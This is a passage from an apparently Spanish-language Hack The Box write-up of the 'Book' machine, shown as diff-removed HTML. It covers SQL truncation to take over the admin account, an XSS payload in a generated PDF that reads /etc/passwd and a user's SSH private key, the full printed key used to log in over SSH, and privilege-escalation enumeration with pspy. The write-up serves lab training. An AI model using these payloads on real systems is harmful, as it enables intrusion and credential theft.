-&lt;p&gt;Notamos que en &lt;strong&gt;Collections&lt;/strong&gt; podemos subir recursos; pero por el momento vamos a mantener esto en standby y vamos a tratar de obtener la cuenta de un usuario administrador y esto lo haremos dentro del panel de registro, vamos a poner en el campo &lt;strong&gt;email: admin@book.htb&lt;/strong&gt;, ya que vamos a suponer que el usuario es admin y el dominio igual al nombre de la máquina con terminación &lt;strong&gt;htb - Hack The Box&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-book/book-web3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-book/book-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;El usuario existe y además si vemos dentro del código fuente del panel de login, vemos que los campos &lt;strong&gt;name&lt;/strong&gt; y &lt;strong&gt;email&lt;/strong&gt; sólo pueden tomar una longitud de 10 caracteres y, el &lt;strong&gt;password&lt;/strong&gt; tiene un máximo de 20 caracteres. Por lo tanto, algo que podríamos probar sería tratar de realizar &lt;a href=&quot;https://linuxhint.com/sql-truncation-attack/&quot;&gt;SQL Truncation&lt;/a&gt;, es decir, ocupar el email de administrador y al final agregar muchos espacios en blanco y al final cualquier cosa, por ejemplo un “1”; ésto lo realizaremos a traves de la herramienta &lt;strong&gt;&lt;em&gt;Burp Suite&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-book/book-burp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora vamos a tratar de loguearnos con el email &lt;strong&gt;admin@book.htb&lt;/strong&gt; y la contraseña que hemos definido, que para este caso es &lt;strong&gt;admin123&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-book/book-web4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Hemos modificado la contraseña del usuario &lt;strong&gt;admin&lt;/strong&gt; y hemos ingresado; sin embargo, el contenido es el mismo que como un usuario normal, por lo que podríamos pensar que debe existir un recurso que nos lleve a un panel de administración y para encontrarlo, vamos a utilizar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-enum &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; 10.10.10.176
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-23 18:01 CST
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.176
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT   STATE SERVICE
-80/tcp open  http
-| http-enum: 
-|   /admin/: Possible admin folder
-|_  /admin/index.php: Possible admin folder
-
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;13.61 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Es correcto, encontramos un recurso bajo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/admin/&lt;/code&gt; en donde posiblemente se tenga un panel y podemos acceder como administrador.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-book/book-web5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ingresamos con las credenciales que tenemos &lt;strong&gt;admin@book.htb : admin123&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-book/book-web6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Entramos al panel de login y si accedemos a la parte de &lt;strong&gt;Collections&lt;/strong&gt; vemos algo diferente:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-book/book-web7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Algo que podríamos probar sería tratar de subir un archivo txt como el usuario normal y luego ver que pasa con el archivo pdf de &lt;strong&gt;Collections&lt;/strong&gt; como usuario admin.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-book/book-pdf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que la informaicón que ponemos en los campos &lt;strong&gt;Book Title&lt;/strong&gt; y &lt;strong&gt;Author&lt;/strong&gt; como un usuario normal, se reflejan dentro del archivo pdf de &lt;strong&gt;Collections&lt;/strong&gt; del usuario &lt;strong&gt;admin&lt;/strong&gt;; por lo que si buscamos un poco, encontramos &lt;a href=&quot;https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/&quot;&gt;Local file read via xss in dynamically generated pdf&lt;/a&gt; y tenemos una forma de poder listar archivos del sistema insertando la instrucción &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);x.send();&amp;lt;/script&amp;gt;&lt;/code&gt;. Así que vamos a probar.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-book/book-pdf1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;, por lo que podemos visualizar el contenido de archivos internos del sistema; por lo tanto, algo que podriamos intentar hacer es tratar de leer el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; del usuario &lt;strong&gt;reader&lt;/strong&gt; y suponiendo que se encuentra bajo al ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/reader/.ssh/id_rsa&lt;/code&gt;. Ejecutaríamos la siguiente instrucción en los campos &lt;strong&gt;Book Title&lt;/strong&gt; y &lt;strong&gt;Author&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;x&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;new XMLHttpRequest&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;x.onload&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;document.write&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;this.responseText&lt;span class=&quot;o&quot;&gt;)}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;x.open&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;file:///home/reader/.ssh/id_rsa&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;x.send&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;lt;/script&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-book/book-pdf2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Tenemos la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; del usuario &lt;strong&gt;reader&lt;/strong&gt;, por lo que generamos un archivo que se llame &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; cuyo contenido es el que vemos en el pdf, le asignamos permiso 600 y procedemos a conectarnos por ssh a la máquina:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;id_rsa
-───────┬────────────────────────────────────────────────────────────────────
-       │ File: id_rsa
-───────┼────────────────────────────────────────────────────────────────────
-   1   │ &lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; RSA PRIVATE KEY-----
-   2   │ MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
-   3   │ G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
-   4   │ WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0
-   5   │ ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s
-   6   │ 7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK
-   7   │ 75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7
-   8   │ 3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+
-   9   │ McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI
-  10   │ tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ
-  11   │ jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz
-  12   │ 7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6
-  13   │ GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL
-  14   │ E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/
-  15   │ ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+
-  16   │ SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l
-  17   │ skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V
-  18   │ o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m
-  19   │ Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC
-  20   │ hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u
-  21   │ Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh
-  22   │ sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf
-  23   │ tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi
-  24   │ 5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW
-  25   │ y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN
-  26   │ nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
-  27   │ &lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; RSA PRIVATE KEY-----
-───────┴─────────────────────────────────────────────────────────────────────
-❯ &lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;600 id_rsa
-❯ ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa reader@10.10.10.176
-The authenticity of host &lt;span class=&quot;s1&quot;&gt;'10.10.10.176 (10.10.10.176)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
-ECDSA key fingerprint is SHA256:QRw8pCXg7E8d9sWI+0Z9nZxClJiq9/eAeT/9wUfoQQk.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '&lt;/span&gt;10.10.10.176&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
-Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Mon Jan 24 00:35:38 UTC 2022
-
-  System load:  0.0               Processes:             209
-  Usage of /:   52.5% of 5.77GB   Users logged in:       0
-  Memory usage: 12%               IP address for ens160: 10.10.10.176
-  Swap usage:   0%
-
-
- * Canonical Livepatch is available for installation.
-   - Reduce system reboots and improve kernel security. Activate at:
-     https://ubuntu.com/livepatch
-
-109 packages can be updated.
-0 updates are security updates.
-
-Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
-
-
-The programs included with the Ubuntu system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-applicable law.
-
-Last login: Wed Jan 29 13:03:06 2020 from 10.10.14.3
-reader@book:~$ whoami
-reader
-reader@book:~$
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya nos encontramos dentro de la máquina como el usuario &lt;strong&gt;reader&lt;/strong&gt; y podemos visualizar la flag (user.txt). Ahora vamos a enumerar un poco el sistema para ver de que forma podemos escalar privilegios.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reader@book:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id                                               
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reader&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reader&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reader&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-reader@book:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;                                          
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;reader:                                     
-reader@book:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /          
-reader@book:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null
-./snap/core/8592/bin/mount
-./snap/core/8592/bin/ping
-./snap/core/8592/bin/ping6
-./snap/core/8592/bin/su
-./snap/core/8592/bin/umount
-./snap/core/8592/usr/bin/chfn
-./snap/core/8592/usr/bin/chsh
-./snap/core/8592/usr/bin/gpasswd 
-./snap/core/8592/usr/bin/newgrp
-./snap/core/8592/usr/bin/passwd
-./snap/core/8592/usr/bin/sudo
-./snap/core/8592/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-./snap/core/8592/usr/lib/openssh/ssh-keysign
-./snap/core/8592/usr/lib/snapd/snap-confine
-./snap/core/8592/usr/sbin/pppd
-./snap/core/11316/bin/mount
-./snap/core/11316/bin/ping
-./snap/core/11316/bin/ping6
-./snap/core/11316/bin/su
-./snap/core/11316/bin/umount
-./snap/core/11316/usr/bin/chfn
-./snap/core/11316/usr/bin/chsh
-./snap/core/11316/usr/bin/gpasswd
-./snap/core/11316/usr/bin/newgrp 
-./snap/core/11316/usr/bin/passwd 
-./snap/core/11316/usr/bin/sudo
-./snap/core/11316/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-./snap/core/11316/usr/lib/openssh/ssh-keysign
-./snap/core/11316/usr/lib/snapd/snap-confine
-./snap/core/11316/usr/sbin/pppd
-./usr/lib/dbus-1.0/dbus-daemon-launch-helper
-./usr/lib/snapd/snap-confine
-./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-./usr/lib/policykit-1/polkit-agent-helper-1
-./usr/lib/openssh/ssh-keysign
-./usr/lib/eject/dmcrypt-get-device
-./usr/bin/chfn
-./usr/bin/at
-./usr/bin/passwd
-./usr/bin/pkexec
-./usr/bin/gpasswd
-./usr/bin/chsh
-./usr/bin/newgrp
-./usr/bin/newgidmap
-./usr/bin/newuidmap
-./usr/bin/sudo
-./usr/bin/traceroute6.iputils
-./bin/mount
-./bin/umount
-./bin/fusermount
-./bin/ping
-./bin/su
-reader@book:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
-Linux book 5.4.1-050401-generic &lt;span class=&quot;c&quot;&gt;#201911290555 SMP Fri Nov 29 11:03:47 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
-reader@book:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;lsb_release &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
-No LSB modules are available.
-Distributor ID: Ubuntu
-Description:    Ubuntu 18.04.2 LTS
-Release:        18.04
-Codename:       bionic
-reader@book:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Nos vemos nada interesante, así que vamos a tratar de buscar tareas que se ejecutan en intervalos regulares y lo haremos con &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot;&gt;pspy&lt;/a&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ git clone https://github.com/DominicBreuker/pspy
-Clonando en &lt;span class=&quot;s1&quot;&gt;'pspy'&lt;/span&gt;...
-remote: Enumerating objects: 1087, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Counting objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;61/61&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;37/37&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Total 1087 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 31&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 37 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 21&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, pack-reused 1026
-Recibiendo objetos: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1087/1087&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 9.28 MiB | 8.89 MiB/s, listo.
-Resolviendo deltas: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;483/483&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, listo.
-❯ &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;pspy/
-❯ &lt;span class=&quot;nv&quot;&gt;GOOS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;linux &lt;span class=&quot;nv&quot;&gt;GOARCH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;amd64 go build &lt;span class=&quot;nt&quot;&gt;-ldflags&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;-s -w&quot;&lt;/span&gt;
-❯ file pspy
-pspy: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go &lt;span class=&quot;nv&quot;&gt;BuildID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;obZo4Q7h3Sz8tBHv4dn4/Aa9VErfRGINSQDhJxKet/1TfDYPfSRgCQEU8fQCNJ/ENOF6bpj1-VeEB1LVfRO, stripped
-❯ &lt;span class=&quot;nb&quot;&gt;du&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-hc&lt;/span&gt; pspy
-2.7M    pspy
-2.7M    total
-❯ upx brute pspy
-                       Ultimate Packer &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;eXecutables
-                          Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1996 - 2020
-UPX 3.96        Markus Oberhumer, Laszlo Molnar &amp;amp; John Reiser   Jan 23rd 2020
-
-        File size         Ratio      Format      Name
-   &lt;span class=&quot;nt&quot;&gt;--------------------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
-upx: brute: FileNotFoundException: brute: No such file or directory
-   2748416 -&amp;gt;   1059492   38.55%   linux/amd64   pspy                          
-
-Packed 1 file.
-❯ &lt;span class=&quot;nb&quot;&gt;du&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-hc&lt;/span&gt; pspy
-1.1M    pspy
-1.1M    total
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Transferimos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pspy&lt;/code&gt; a la máquina víctima en un directorio donde tengamos permisos:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
-Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
-10.10.10.176 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;23/Jan/2022 22:28:38] &lt;span class=&quot;s2&quot;&gt;&quot;GET /pspy HTTP/1.1&quot;&lt;/span&gt; 200 -
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reader@book:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /dev/shm/
-reader@book:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://10.10.14.27/pspy
-&lt;span class=&quot;nt&quot;&gt;--2022-01-24&lt;/span&gt; 04:28:30--  http://10.10.14.27/pspy
-Connecting to 10.10.14.27:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 1059492 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.0M&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;application/octet-stream]
-Saving to: ‘pspy’
-
-pspy                             100%[&lt;span class=&quot;o&quot;&gt;=======================================================&amp;gt;]&lt;/span&gt;   1.01M  1.13MB/s    &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.9s    
-
-2022-01-24 04:28:32 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.13 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - ‘pspy’ saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1059492/1059492]
-
-reader@book:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Le damos permisos de ejecución y lo corremos.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reader@book:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x pspy 
-reader@book:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-total 1036
-&lt;span class=&quot;nt&quot;&gt;-rwxrwxr-x&lt;/span&gt; 1 reader reader 1059492 Jan 24 00:53 pspy
-reader@book:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./pspy                                                                                                     
-pspy - version:  - Commit SHA:                                                                                                   
-                                                                                                                                 
-                                                                                                                                 
-     ██▓███    ██████  ██▓███ ▓██   ██▓                                                                                          
-    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                                                                          
-    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                                                                          
-    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░                                                                                          
-    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                                                                          
-    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒         
-    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                                                                                           
-    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                                                                                            
-                   ░           ░ ░                                                                                               
-                               ░ ░                                                                                               
-                                                                                                                                 
-Config: Printing events &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colored&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: &lt;span class=&quot;nv&quot;&gt;processes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt; | file-system-events&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;| Scannning &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;processes every 100ms and on 
